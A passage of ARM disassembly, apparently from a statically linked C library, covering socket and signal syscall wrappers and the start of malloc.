   16c94:	9a000005 	bls	16cb0 <getsockopt+0x38>
   16c98:	e59f301c 	ldr	r3, [pc, #28]	; 16cbc <getsockopt+0x44>
   16c9c:	eb000ef3 	bl	1a870 <__aeabi_read_tp>
   16ca0:	e79f3003 	ldr	r3, [pc, r3]
   16ca4:	e2622000 	rsb	r2, r2, #0
   16ca8:	e7802003 	str	r2, [r0, r3]
   16cac:	e3e00000 	mvn	r0, #0
   16cb0:	e8bd4090 	pop	{r4, r7, lr}
   16cb4:	e12fff1e 	bx	lr
   16cb8:	00000127 	.word	0x00000127
   16cbc:	00011d44 	.word	0x00011d44

00016cc0 <__GI_listen>:
   16cc0:	e92d4080 	push	{r7, lr}
   16cc4:	e3a07f47 	mov	r7, #284	; 0x11c
   16cc8:	ef000000 	svc	0x00000000
   16ccc:	e3700a01 	cmn	r0, #4096	; 0x1000
   16cd0:	e1a02000 	mov	r2, r0
   16cd4:	91a00000 	movls	r0, r0
   16cd8:	9a000005 	bls	16cf4 <__GI_listen+0x34>
   16cdc:	e59f3018 	ldr	r3, [pc, #24]	; 16cfc <__GI_listen+0x3c>
   16ce0:	eb000ee2 	bl	1a870 <__aeabi_read_tp>
   16ce4:	e79f3003 	ldr	r3, [pc, r3]
   16ce8:	e2622000 	rsb	r2, r2, #0
   16cec:	e7802003 	str	r2, [r0, r3]
   16cf0:	e3e00000 	mvn	r0, #0
   16cf4:	e8bd4080 	pop	{r7, lr}
   16cf8:	e12fff1e 	bx	lr
   16cfc:	00011d00 	.word	0x00011d00

00016d00 <__sys_recv>:
   16d00:	e92d4080 	push	{r7, lr}
   16d04:	e59f7030 	ldr	r7, [pc, #48]	; 16d3c <__sys_recv+0x3c>
   16d08:	ef000000 	svc	0x00000000
   16d0c:	e3700a01 	cmn	r0, #4096	; 0x1000
   16d10:	e1a02000 	mov	r2, r0
   16d14:	91a00000 	movls	r0, r0
   16d18:	9a000005 	bls	16d34 <__sys_recv+0x34>
   16d1c:	e59f301c 	ldr	r3, [pc, #28]	; 16d40 <__sys_recv+0x40>
   16d20:	eb000ed2 	bl	1a870 <__aeabi_read_tp>
   16d24:	e79f3003 	ldr	r3, [pc, r3]
   16d28:	e2622000 	rsb	r2, r2, #0
   16d2c:	e7802003 	str	r2, [r0, r3]
   16d30:	e3e00000 	mvn	r0, #0
   16d34:	e8bd4080 	pop	{r7, lr}
   16d38:	e12fff1e 	bx	lr
   16d3c:	00000123 	.word	0x00000123
   16d40:	00011cc0 	.word	0x00011cc0

00016d44 <__libc_recv>:
   16d44:	e59fc060 	ldr	ip, [pc, #96]	; 16dac <__libc_recv+0x68>
   16d48:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   16d4c:	e59fe05c 	ldr	lr, [pc, #92]	; 16db0 <__libc_recv+0x6c>
   16d50:	e08fc00c 	add	ip, pc, ip
   16d54:	e79ce00e 	ldr	lr, [ip, lr]
   16d58:	e35e0000 	cmp	lr, #0
   16d5c:	e1a04000 	mov	r4, r0
   16d60:	e1a06001 	mov	r6, r1
   16d64:	e1a07002 	mov	r7, r2
   16d68:	e1a08003 	mov	r8, r3
   16d6c:	1a000001 	bne	16d78 <__libc_recv+0x34>
   16d70:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   16d74:	eaffffe1 	b	16d00 <__sys_recv>
   16d78:	eb000cda 	bl	1a0e8 <__libc_enable_asynccancel>
   16d7c:	e1a01006 	mov	r1, r6
   16d80:	e1a05000 	mov	r5, r0
   16d84:	e1a02007 	mov	r2, r7
   16d88:	e1a03008 	mov	r3, r8
   16d8c:	e1a00004 	mov	r0, r4
   16d90:	ebffffda 	bl	16d00 <__sys_recv>
   16d94:	e1a04000 	mov	r4, r0
   16d98:	e1a00005 	mov	r0, r5
   16d9c:	eb000caf 	bl	1a060 <__libc_disable_asynccancel>
   16da0:	e1a00004 	mov	r0, r4
   16da4:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   16da8:	e12fff1e 	bx	lr
   16dac:	00011c3c 	.word	0x00011c3c
   16db0:	0000356c 	.word	0x0000356c

00016db4 <__sys_recvfrom>:
   16db4:	e92d40b0 	push	{r4, r5, r7, lr}
   16db8:	e28d4010 	add	r4, sp, #16
   16dbc:	e8940030 	ldm	r4, {r4, r5}
   16dc0:	e3a07f49 	mov	r7, #292	; 0x124
   16dc4:	ef000000 	svc	0x00000000
   16dc8:	e3700a01 	cmn	r0, #4096	; 0x1000
   16dcc:	e1a02000 	mov	r2, r0
   16dd0:	91a00000 	movls	r0, r0
   16dd4:	9a000005 	bls	16df0 <__sys_recvfrom+0x3c>
   16dd8:	e59f3018 	ldr	r3, [pc, #24]	; 16df8 <__sys_recvfrom+0x44>
   16ddc:	eb000ea3 	bl	1a870 <__aeabi_read_tp>
   16de0:	e79f3003 	ldr	r3, [pc, r3]
   16de4:	e2622000 	rsb	r2, r2, #0
   16de8:	e7802003 	str	r2, [r0, r3]
   16dec:	e3e00000 	mvn	r0, #0
   16df0:	e8bd40b0 	pop	{r4, r5, r7, lr}
   16df4:	e12fff1e 	bx	lr
   16df8:	00011c04 	.word	0x00011c04

00016dfc <__libc_recvfrom>:
   16dfc:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
   16e00:	e59fc074 	ldr	ip, [pc, #116]	; 16e7c <__libc_recvfrom+0x80>
   16e04:	e59fe074 	ldr	lr, [pc, #116]	; 16e80 <__libc_recvfrom+0x84>
   16e08:	e08fc00c 	add	ip, pc, ip
   16e0c:	e79ce00e 	ldr	lr, [ip, lr]
   16e10:	e24dd008 	sub	sp, sp, #8
   16e14:	e35e0000 	cmp	lr, #0
   16e18:	e1a09000 	mov	r9, r0
   16e1c:	e1a07001 	mov	r7, r1
   16e20:	e1a08002 	mov	r8, r2
   16e24:	e1a0a003 	mov	sl, r3
   16e28:	e28d4028 	add	r4, sp, #40	; 0x28
   16e2c:	e8940050 	ldm	r4, {r4, r6}
   16e30:	1a000002 	bne	16e40 <__libc_recvfrom+0x44>
   16e34:	e28dd008 	add	sp, sp, #8
   16e38:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   16e3c:	eaffffdc 	b	16db4 <__sys_recvfrom>
   16e40:	eb000ca8 	bl	1a0e8 <__libc_enable_asynccancel>
   16e44:	e1a01007 	mov	r1, r7
   16e48:	e1a05000 	mov	r5, r0
   16e4c:	e1a02008 	mov	r2, r8
   16e50:	e1a0300a 	mov	r3, sl
   16e54:	e1a00009 	mov	r0, r9
   16e58:	e88d0050 	stm	sp, {r4, r6}
   16e5c:	ebffffd4 	bl	16db4 <__sys_recvfrom>
   16e60:	e1a04000 	mov	r4, r0
   16e64:	e1a00005 	mov	r0, r5
   16e68:	eb000c7c 	bl	1a060 <__libc_disable_asynccancel>
   16e6c:	e1a00004 	mov	r0, r4
   16e70:	e28dd008 	add	sp, sp, #8
   16e74:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   16e78:	e12fff1e 	bx	lr
   16e7c:	00011b84 	.word	0x00011b84
   16e80:	0000356c 	.word	0x0000356c

00016e84 <__sys_send>:
   16e84:	e92d4080 	push	{r7, lr}
   16e88:	e59f7030 	ldr	r7, [pc, #48]	; 16ec0 <__sys_send+0x3c>
   16e8c:	ef000000 	svc	0x00000000
   16e90:	e3700a01 	cmn	r0, #4096	; 0x1000
   16e94:	e1a02000 	mov	r2, r0
   16e98:	91a00000 	movls	r0, r0
   16e9c:	9a000005 	bls	16eb8 <__sys_send+0x34>
   16ea0:	e59f301c 	ldr	r3, [pc, #28]	; 16ec4 <__sys_send+0x40>
   16ea4:	eb000e71 	bl	1a870 <__aeabi_read_tp>
   16ea8:	e79f3003 	ldr	r3, [pc, r3]
   16eac:	e2622000 	rsb	r2, r2, #0
   16eb0:	e7802003 	str	r2, [r0, r3]
   16eb4:	e3e00000 	mvn	r0, #0
   16eb8:	e8bd4080 	pop	{r7, lr}
   16ebc:	e12fff1e 	bx	lr
   16ec0:	00000121 	.word	0x00000121
   16ec4:	00011b3c 	.word	0x00011b3c

00016ec8 <__libc_send>:
   16ec8:	e59fc060 	ldr	ip, [pc, #96]	; 16f30 <__libc_send+0x68>
   16ecc:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   16ed0:	e59fe05c 	ldr	lr, [pc, #92]	; 16f34 <__libc_send+0x6c>
   16ed4:	e08fc00c 	add	ip, pc, ip
   16ed8:	e79ce00e 	ldr	lr, [ip, lr]
   16edc:	e35e0000 	cmp	lr, #0
   16ee0:	e1a04000 	mov	r4, r0
   16ee4:	e1a06001 	mov	r6, r1
   16ee8:	e1a07002 	mov	r7, r2
   16eec:	e1a08003 	mov	r8, r3
   16ef0:	1a000001 	bne	16efc <__libc_send+0x34>
   16ef4:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   16ef8:	eaffffe1 	b	16e84 <__sys_send>
   16efc:	eb000c79 	bl	1a0e8 <__libc_enable_asynccancel>
   16f00:	e1a01006 	mov	r1, r6
   16f04:	e1a05000 	mov	r5, r0
   16f08:	e1a02007 	mov	r2, r7
   16f0c:	e1a03008 	mov	r3, r8
   16f10:	e1a00004 	mov	r0, r4
   16f14:	ebffffda 	bl	16e84 <__sys_send>
   16f18:	e1a04000 	mov	r4, r0
   16f1c:	e1a00005 	mov	r0, r5
   16f20:	eb000c4e 	bl	1a060 <__libc_disable_asynccancel>
   16f24:	e1a00004 	mov	r0, r4
   16f28:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   16f2c:	e12fff1e 	bx	lr
   16f30:	00011ab8 	.word	0x00011ab8
   16f34:	0000356c 	.word	0x0000356c

00016f38 <__sys_sendto>:
   16f38:	e92d40b0 	push	{r4, r5, r7, lr}
   16f3c:	e28d4010 	add	r4, sp, #16
   16f40:	e8940030 	ldm	r4, {r4, r5}
   16f44:	e59f7030 	ldr	r7, [pc, #48]	; 16f7c <__sys_sendto+0x44>
   16f48:	ef000000 	svc	0x00000000
   16f4c:	e3700a01 	cmn	r0, #4096	; 0x1000
   16f50:	e1a02000 	mov	r2, r0
   16f54:	91a00000 	movls	r0, r0
   16f58:	9a000005 	bls	16f74 <__sys_sendto+0x3c>
   16f5c:	e59f301c 	ldr	r3, [pc, #28]	; 16f80 <__sys_sendto+0x48>
   16f60:	eb000e42 	bl	1a870 <__aeabi_read_tp>
   16f64:	e79f3003 	ldr	r3, [pc, r3]
   16f68:	e2622000 	rsb	r2, r2, #0
   16f6c:	e7802003 	str	r2, [r0, r3]
   16f70:	e3e00000 	mvn	r0, #0
   16f74:	e8bd40b0 	pop	{r4, r5, r7, lr}
   16f78:	e12fff1e 	bx	lr
   16f7c:	00000122 	.word	0x00000122
   16f80:	00011a80 	.word	0x00011a80

00016f84 <__libc_sendto>:
   16f84:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
   16f88:	e59fc074 	ldr	ip, [pc, #116]	; 17004 <__libc_sendto+0x80>
   16f8c:	e59fe074 	ldr	lr, [pc, #116]	; 17008 <__libc_sendto+0x84>
   16f90:	e08fc00c 	add	ip, pc, ip
   16f94:	e79ce00e 	ldr	lr, [ip, lr]
   16f98:	e24dd008 	sub	sp, sp, #8
   16f9c:	e35e0000 	cmp	lr, #0
   16fa0:	e1a09000 	mov	r9, r0
   16fa4:	e1a07001 	mov	r7, r1
   16fa8:	e1a08002 	mov	r8, r2
   16fac:	e1a0a003 	mov	sl, r3
   16fb0:	e28d4028 	add	r4, sp, #40	; 0x28
   16fb4:	e8940050 	ldm	r4, {r4, r6}
   16fb8:	1a000002 	bne	16fc8 <__libc_sendto+0x44>
   16fbc:	e28dd008 	add	sp, sp, #8
   16fc0:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   16fc4:	eaffffdb 	b	16f38 <__sys_sendto>
   16fc8:	eb000c46 	bl	1a0e8 <__libc_enable_asynccancel>
   16fcc:	e1a01007 	mov	r1, r7
   16fd0:	e1a05000 	mov	r5, r0
   16fd4:	e1a02008 	mov	r2, r8
   16fd8:	e1a0300a 	mov	r3, sl
   16fdc:	e1a00009 	mov	r0, r9
   16fe0:	e88d0050 	stm	sp, {r4, r6}
   16fe4:	ebffffd3 	bl	16f38 <__sys_sendto>
   16fe8:	e1a04000 	mov	r4, r0
   16fec:	e1a00005 	mov	r0, r5
   16ff0:	eb000c1a 	bl	1a060 <__libc_disable_asynccancel>
   16ff4:	e1a00004 	mov	r0, r4
   16ff8:	e28dd008 	add	sp, sp, #8
   16ffc:	e8bd47f0 	pop	{r4, r5, r6, r7, r8, r9, sl, lr}
   17000:	e12fff1e 	bx	lr
   17004:	000119fc 	.word	0x000119fc
   17008:	0000356c 	.word	0x0000356c

0001700c <__GI_setsockopt>:
   1700c:	e92d4090 	push	{r4, r7, lr}
   17010:	e59d400c 	ldr	r4, [sp, #12]
   17014:	e59f7030 	ldr	r7, [pc, #48]	; 1704c <__GI_setsockopt+0x40>
   17018:	ef000000 	svc	0x00000000
   1701c:	e3700a01 	cmn	r0, #4096	; 0x1000
   17020:	e1a02000 	mov	r2, r0
   17024:	91a00000 	movls	r0, r0
   17028:	9a000005 	bls	17044 <__GI_setsockopt+0x38>
   1702c:	e59f301c 	ldr	r3, [pc, #28]	; 17050 <__GI_setsockopt+0x44>
   17030:	eb000e0e 	bl	1a870 <__aeabi_read_tp>
   17034:	e79f3003 	ldr	r3, [pc, r3]
   17038:	e2622000 	rsb	r2, r2, #0
   1703c:	e7802003 	str	r2, [r0, r3]
   17040:	e3e00000 	mvn	r0, #0
   17044:	e8bd4090 	pop	{r4, r7, lr}
   17048:	e12fff1e 	bx	lr
   1704c:	00000126 	.word	0x00000126
   17050:	000119b0 	.word	0x000119b0

00017054 <__GI_socket>:
   17054:	e92d4080 	push	{r7, lr}
   17058:	e59f7030 	ldr	r7, [pc, #48]	; 17090 <__GI_socket+0x3c>
   1705c:	ef000000 	svc	0x00000000
   17060:	e3700a01 	cmn	r0, #4096	; 0x1000
   17064:	e1a02000 	mov	r2, r0
   17068:	91a00000 	movls	r0, r0
   1706c:	9a000005 	bls	17088 <__GI_socket+0x34>
   17070:	e59f301c 	ldr	r3, [pc, #28]	; 17094 <__GI_socket+0x40>
   17074:	eb000dfd 	bl	1a870 <__aeabi_read_tp>
   17078:	e79f3003 	ldr	r3, [pc, r3]
   1707c:	e2622000 	rsb	r2, r2, #0
   17080:	e7802003 	str	r2, [r0, r3]
   17084:	e3e00000 	mvn	r0, #0
   17088:	e8bd4080 	pop	{r7, lr}
   1708c:	e12fff1e 	bx	lr
   17090:	00000119 	.word	0x00000119
   17094:	0001196c 	.word	0x0001196c

00017098 <__GI_sigaddset>:
   17098:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1709c:	e2513000 	subs	r3, r1, #0
   170a0:	e24dd004 	sub	sp, sp, #4
   170a4:	da000001 	ble	170b0 <__GI_sigaddset+0x18>
   170a8:	e3530040 	cmp	r3, #64	; 0x40
   170ac:	da000006 	ble	170cc <__GI_sigaddset+0x34>
   170b0:	e59f202c 	ldr	r2, [pc, #44]	; 170e4 <__GI_sigaddset+0x4c>
   170b4:	eb000ded 	bl	1a870 <__aeabi_read_tp>
   170b8:	e79f2002 	ldr	r2, [pc, r2]
   170bc:	e3a03016 	mov	r3, #22
   170c0:	e3e01000 	mvn	r1, #0
   170c4:	e7803002 	str	r3, [r0, r2]
   170c8:	ea000001 	b	170d4 <__GI_sigaddset+0x3c>
   170cc:	eb000044 	bl	171e4 <__GI___sigaddset>
   170d0:	e1a01000 	mov	r1, r0
   170d4:	e1a00001 	mov	r0, r1
   170d8:	e28dd004 	add	sp, sp, #4
   170dc:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   170e0:	e12fff1e 	bx	lr
   170e4:	0001192c 	.word	0x0001192c

000170e8 <__GI_sigemptyset>:
   170e8:	e1a03000 	mov	r3, r0
   170ec:	e3a00000 	mov	r0, #0
   170f0:	e5830004 	str	r0, [r3, #4]
   170f4:	e5830000 	str	r0, [r3]
   170f8:	e12fff1e 	bx	lr

000170fc <__GI_signal>:
   170fc:	e92d4070 	push	{r4, r5, r6, lr}
   17100:	e59f60ac 	ldr	r6, [pc, #172]	; 171b4 <__GI_signal+0xb8>
   17104:	e3710001 	cmn	r1, #1
   17108:	13500000 	cmpne	r0, #0
   1710c:	e24dd028 	sub	sp, sp, #40	; 0x28
   17110:	e1a03001 	mov	r3, r1
   17114:	e1a05000 	mov	r5, r0
   17118:	c3a02000 	movgt	r2, #0
   1711c:	d3a02001 	movle	r2, #1
   17120:	e08f6006 	add	r6, pc, r6
   17124:	da000001 	ble	17130 <__GI_signal+0x34>
   17128:	e3500040 	cmp	r0, #64	; 0x40
   1712c:	da000006 	ble	1714c <__GI_signal+0x50>
   17130:	e59f2080 	ldr	r2, [pc, #128]	; 171b8 <__GI_signal+0xbc>
   17134:	eb000dcd 	bl	1a870 <__aeabi_read_tp>
   17138:	e79f2002 	ldr	r2, [pc, r2]
   1713c:	e3a03016 	mov	r3, #22
   17140:	e3e01000 	mvn	r1, #0
   17144:	e7803002 	str	r3, [r0, r2]
   17148:	ea000015 	b	171a4 <__GI_signal+0xa8>
   1714c:	e28d4014 	add	r4, sp, #20
   17150:	e1a01000 	mov	r1, r0
   17154:	e284000c 	add	r0, r4, #12
   17158:	e58d3014 	str	r3, [sp, #20]
   1715c:	e58d2024 	str	r2, [sp, #36]	; 0x24
   17160:	e58d2020 	str	r2, [sp, #32]
   17164:	eb00001e 	bl	171e4 <__GI___sigaddset>
   17168:	e59f004c 	ldr	r0, [pc, #76]	; 171bc <__GI_signal+0xc0>
   1716c:	e1a01005 	mov	r1, r5
   17170:	e0860000 	add	r0, r6, r0
   17174:	eb000011 	bl	171c0 <__GI___sigismember>
   17178:	e3500000 	cmp	r0, #0
   1717c:	03a03201 	moveq	r3, #268435456	; 0x10000000
   17180:	13a03000 	movne	r3, #0
   17184:	e1a01004 	mov	r1, r4
   17188:	e1a00005 	mov	r0, r5
   1718c:	e1a0200d 	mov	r2, sp
   17190:	e58d3018 	str	r3, [sp, #24]
   17194:	eb000d8a 	bl	1a7c4 <__libc_sigaction>
   17198:	e3500000 	cmp	r0, #0
   1719c:	a59d1000 	ldrge	r1, [sp]
   171a0:	b3e01000 	mvnlt	r1, #0
   171a4:	e1a00001 	mov	r0, r1
   171a8:	e28dd028 	add	sp, sp, #40	; 0x28
   171ac:	e8bd4070 	pop	{r4, r5, r6, lr}
   171b0:	e12fff1e 	bx	lr
   171b4:	0001186c 	.word	0x0001186c
   171b8:	000118ac 	.word	0x000118ac
   171bc:	000031e4 	.word	0x000031e4

000171c0 <__GI___sigismember>:
   171c0:	e2411001 	sub	r1, r1, #1
   171c4:	e1a032a1 	lsr	r3, r1, #5
   171c8:	e7902103 	ldr	r2, [r0, r3, lsl #2]
   171cc:	e201101f 	and	r1, r1, #31
   171d0:	e3a03001 	mov	r3, #1
   171d4:	e0123113 	ands	r3, r2, r3, lsl r1
   171d8:	03a00000 	moveq	r0, #0
   171dc:	13a00001 	movne	r0, #1
   171e0:	e12fff1e 	bx	lr

000171e4 <__GI___sigaddset>:
   171e4:	e2411001 	sub	r1, r1, #1
   171e8:	e1a0c2a1 	lsr	ip, r1, #5
   171ec:	e790310c 	ldr	r3, [r0, ip, lsl #2]
   171f0:	e201101f 	and	r1, r1, #31
   171f4:	e3a02001 	mov	r2, #1
   171f8:	e1833112 	orr	r3, r3, r2, lsl r1
   171fc:	e780310c 	str	r3, [r0, ip, lsl #2]
   17200:	e3a00000 	mov	r0, #0
   17204:	e12fff1e 	bx	lr

00017208 <__GI___sigdelset>:
   17208:	e2411001 	sub	r1, r1, #1
   1720c:	e1a0c2a1 	lsr	ip, r1, #5
   17210:	e790310c 	ldr	r3, [r0, ip, lsl #2]
   17214:	e201101f 	and	r1, r1, #31
   17218:	e3a02001 	mov	r2, #1
   1721c:	e1c33112 	bic	r3, r3, r2, lsl r1
   17220:	e780310c 	str	r3, [r0, ip, lsl #2]
   17224:	e3a00000 	mov	r0, #0
   17228:	e12fff1e 	bx	lr

0001722c <__malloc_largebin_index>:
   1722c:	e1a01420 	lsr	r1, r0, #8
   17230:	e3510801 	cmp	r1, #65536	; 0x10000
   17234:	e1a0c000 	mov	ip, r0
   17238:	23a0005f 	movcs	r0, #95	; 0x5f
   1723c:	212fff1e 	bxcs	lr
   17240:	e2413c01 	sub	r3, r1, #256	; 0x100
   17244:	e1a03823 	lsr	r3, r3, #16
   17248:	e2033008 	and	r3, r3, #8
   1724c:	e1a01311 	lsl	r1, r1, r3
   17250:	e2412a01 	sub	r2, r1, #4096	; 0x1000
   17254:	e1a02822 	lsr	r2, r2, #16
   17258:	e2022004 	and	r2, r2, #4
   1725c:	e1a01211 	lsl	r1, r1, r2
   17260:	e2410901 	sub	r0, r1, #16384	; 0x4000
   17264:	e1a00820 	lsr	r0, r0, #16
   17268:	e2000002 	and	r0, r0, #2
   1726c:	e1a01011 	lsl	r1, r1, r0
   17270:	e263300d 	rsb	r3, r3, #13
   17274:	e0623003 	rsb	r3, r2, r3
   17278:	e1e027a1 	mvn	r2, r1, lsr #15
   1727c:	e0022721 	and	r2, r2, r1, lsr #14
   17280:	e0603003 	rsb	r3, r0, r3
   17284:	e0833002 	add	r3, r3, r2
   17288:	e2832006 	add	r2, r3, #6
   1728c:	e1a0223c 	lsr	r2, ip, r2
   17290:	e1a03103 	lsl	r3, r3, #2
   17294:	e2833020 	add	r3, r3, #32
   17298:	e2022003 	and	r2, r2, #3
   1729c:	e0830002 	add	r0, r3, r2
   172a0:	e12fff1e 	bx	lr

000172a4 <malloc>:
   172a4:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   172a8:	e59f1908 	ldr	r1, [pc, #2312]	; 17bb8 <malloc+0x914>
   172ac:	e59f3908 	ldr	r3, [pc, #2312]	; 17bbc <malloc+0x918>
   172b0:	e08f1001 	add	r1, pc, r1
   172b4:	e24dd02c 	sub	sp, sp, #44	; 0x2c
   172b8:	e7914003 	ldr	r4, [r1, r3]
   172bc:	e59f38fc 	ldr	r3, [pc, #2300]	; 17bc0 <malloc+0x91c>
   172c0:	e58d100c 	str	r1, [sp, #12]
   172c4:	e7911003 	ldr	r1, [r1, r3]
   172c8:	e1a05000 	mov	r5, r0
   172cc:	e1a02004 	mov	r2, r4
   172d0:	e28d0018 	add	r0, sp, #24
   172d4:	e59f38e8 	ldr	r3, [pc, #2280]	; 17bc4 <malloc+0x920>
   172d8:	e59dc00c 	ldr	ip, [sp, #12]
   172dc:	e79cc003 	ldr	ip, [ip, r3]
   172e0:	e1a0e00f 	mov	lr, pc
   172e4:	e12fff1c 	bx	ip
   172e8:	e1a00004 	mov	r0, r4
   172ec:	e59f38d4 	ldr	r3, [pc, #2260]	; 17bc8 <malloc+0x924>
   172f0:	e59d100c 	ldr	r1, [sp, #12]
   172f4:	e791c003 	ldr	ip, [r1, r3]
   172f8:	e1a0e00f 	mov	lr, pc
   172fc:	e12fff1c 	bx	ip
   17300:	e3750021 	cmn	r5, #33	; 0x21
   17304:	9a000006 	bls	17324 <malloc+0x80>
   17308:	e59f28bc 	ldr	r2, [pc, #2236]	; 17bcc <malloc+0x928>
   1730c:	eb000d57 	bl	1a870 <__aeabi_read_tp>
   17310:	e79f2002 	ldr	r2, [pc, r2]
   17314:	e3a0300c 	mov	r3, #12
   17318:	e3a04000 	mov	r4, #0
   1731c:	e7803002 	str	r3, [r0, r2]
   17320:	ea000220 	b	17ba8 <malloc+0x904>
   17324:	e285000b 	add	r0, r5, #11
   17328:	e59f38a0 	ldr	r3, [pc, #2208]	; 17bd0 <malloc+0x92c>
   1732c:	e59d200c 	ldr	r2, [sp, #12]
   17330:	e350000f 	cmp	r0, #15
   17334:	83c0a007 	bichi	sl, r0, #7
   17338:	e7920003 	ldr	r0, [r2, r3]
   1733c:	e5904000 	ldr	r4, [r0]
   17340:	93a0a010 	movls	sl, #16
   17344:	e3140001 	tst	r4, #1
   17348:	1a000003 	bne	1735c <malloc+0xb8>
   1734c:	e3540000 	cmp	r4, #0
   17350:	1a0000f8 	bne	17738 <malloc+0x494>
   17354:	eb00038c 	bl	1818c <__malloc_consolidate>
   17358:	ea0000f6 	b	17738 <malloc+0x494>
   1735c:	e15a0004 	cmp	sl, r4
   17360:	8a000007 	bhi	17384 <malloc+0xe0>
   17364:	e2401004 	sub	r1, r0, #4
   17368:	e1a021aa 	lsr	r2, sl, #3
   1736c:	e7910102 	ldr	r0, [r1, r2, lsl #2]
   17370:	e3500000 	cmp	r0, #0
   17374:	15b03008 	ldrne	r3, [r0, #8]!
   17378:	11a04000 	movne	r4, r0
   1737c:	17813102 	strne	r3, [r1, r2, lsl #2]
   17380:	1a000201 	bne	17b8c <malloc+0x8e8>
   17384:	e35a00ff 	cmp	sl, #255	; 0xff
   17388:	8a000011 	bhi	173d4 <malloc+0x130>
   1738c:	e59dc00c 	ldr	ip, [sp, #12]
   17390:	e59f3838 	ldr	r3, [pc, #2104]	; 17bd0 <malloc+0x92c>
   17394:	e79c3003 	ldr	r3, [ip, r3]
   17398:	e1a071aa 	lsr	r7, sl, #3
   1739c:	e0833187 	add	r3, r3, r7, lsl #3
   173a0:	e283c02c 	add	ip, r3, #44	; 0x2c
   173a4:	e59c000c 	ldr	r0, [ip, #12]
   173a8:	e150000c 	cmp	r0, ip
   173ac:	0a000060 	beq	17534 <malloc+0x290>
   173b0:	e080300a 	add	r3, r0, sl
   173b4:	e5932004 	ldr	r2, [r3, #4]
   173b8:	e590100c 	ldr	r1, [r0, #12]
   173bc:	e3822001 	orr	r2, r2, #1
   173c0:	e2804008 	add	r4, r0, #8
   173c4:	e5832004 	str	r2, [r3, #4]
   173c8:	e581c008 	str	ip, [r1, #8]
   173cc:	e58c100c 	str	r1, [ip, #12]
   173d0:	ea0001ed 	b	17b8c <malloc+0x8e8>
   173d4:	e1a0000a 	mov	r0, sl
   173d8:	ebffff93 	bl	1722c <__malloc_largebin_index>
   173dc:	e3140002 	tst	r4, #2
   173e0:	e1a07000 	mov	r7, r0
   173e4:	0a000052 	beq	17534 <malloc+0x290>
   173e8:	e59f37e0 	ldr	r3, [pc, #2016]	; 17bd0 <malloc+0x92c>
   173ec:	e59d100c 	ldr	r1, [sp, #12]
   173f0:	e7910003 	ldr	r0, [r1, r3]
   173f4:	eb000364 	bl	1818c <__malloc_consolidate>
   173f8:	ea00004d 	b	17534 <malloc+0x290>
   173fc:	e5963004 	ldr	r3, [r6, #4]
   17400:	e35a00ff 	cmp	sl, #255	; 0xff
   17404:	e3c34003 	bic	r4, r3, #3
   17408:	e596c00c 	ldr	ip, [r6, #12]
   1740c:	8a000014 	bhi	17464 <malloc+0x1c0>
   17410:	e15c0005 	cmp	ip, r5
   17414:	1a000012 	bne	17464 <malloc+0x1c0>
   17418:	e5993030 	ldr	r3, [r9, #48]	; 0x30
   1741c:	e1560003 	cmp	r6, r3
   17420:	1a00000f 	bne	17464 <malloc+0x1c0>
   17424:	e154000b 	cmp	r4, fp
   17428:	9a00000d 	bls	17464 <malloc+0x1c0>
   1742c:	e06a2004 	rsb	r2, sl, r4
   17430:	e086300a 	add	r3, r6, sl
   17434:	e38a0001 	orr	r0, sl, #1
   17438:	e3821001 	orr	r1, r2, #1
   1743c:	e2864008 	add	r4, r6, #8
   17440:	e58c3008 	str	r3, [ip, #8]
   17444:	e58c300c 	str	r3, [ip, #12]
   17448:	e5860004 	str	r0, [r6, #4]
   1744c:	e5893030 	str	r3, [r9, #48]	; 0x30
   17450:	e7832002 	str	r2, [r3, r2]
   17454:	e5831004 	str	r1, [r3, #4]
   17458:	e583c00c 	str	ip, [r3, #12]
   1745c:	e583c008 	str	ip, [r3, #8]
   17460:	ea0001c9 	b	17b8c <malloc+0x8e8>
   17464:	e154000a 	cmp	r4, sl
   17468:	e58c5008 	str	r5, [ip, #8]
   1746c:	e585c00c 	str	ip, [r5, #12]
   17470:	0086200a 	addeq	r2, r6, sl
   17474:	05923004 	ldreq	r3, [r2, #4]
   17478:	02864008 	addeq	r4, r6, #8
   1747c:	0a000050 	beq	175c4 <malloc+0x320>
   17480:	e35400ff 	cmp	r4, #255	; 0xff
   17484:	8a000006 	bhi	174a4 <malloc+0x200>
   17488:	e59d200c 	ldr	r2, [sp, #12]
   1748c:	e7923008 	ldr	r3, [r2, r8]
   17490:	e1a001a4 	lsr	r0, r4, #3
   17494:	e0833180 	add	r3, r3, r0, lsl #3
   17498:	e283c02c 	add	ip, r3, #44	; 0x2c
   1749c:	e59ce008 	ldr	lr, [ip, #8]
   174a0:	ea000015 	b	174fc <malloc+0x258>
   174a4:	e1a00004 	mov	r0, r4
   174a8:	ebffff5f 	bl	1722c <__malloc_largebin_index>
   174ac:	e59dc00c 	ldr	ip, [sp, #12]
   174b0:	e79c3008 	ldr	r3, [ip, r8]
   174b4:	e0833180 	add	r3, r3, r0, lsl #3
   174b8:	e283c02c 	add	ip, r3, #44	; 0x2c
   174bc:	e59ce008 	ldr	lr, [ip, #8]
   174c0:	e15e000c 	cmp	lr, ip
   174c4:	0a00000c 	beq	174fc <malloc+0x258>
   174c8:	e59c100c 	ldr	r1, [ip, #12]
   174cc:	e5913004 	ldr	r3, [r1, #4]
   174d0:	e1540003 	cmp	r4, r3
   174d4:	31a0e00c 	movcc	lr, ip
   174d8:	23842001 	orrcs	r2, r4, #1
   174dc:	31a0c001 	movcc	ip, r1
   174e0:	2a000001 	bcs	174ec <malloc+0x248>
   174e4:	ea000004 	b	174fc <malloc+0x258>
   174e8:	e59ee008 	ldr	lr, [lr, #8]
   174ec:	e59e3004 	ldr	r3, [lr, #4]
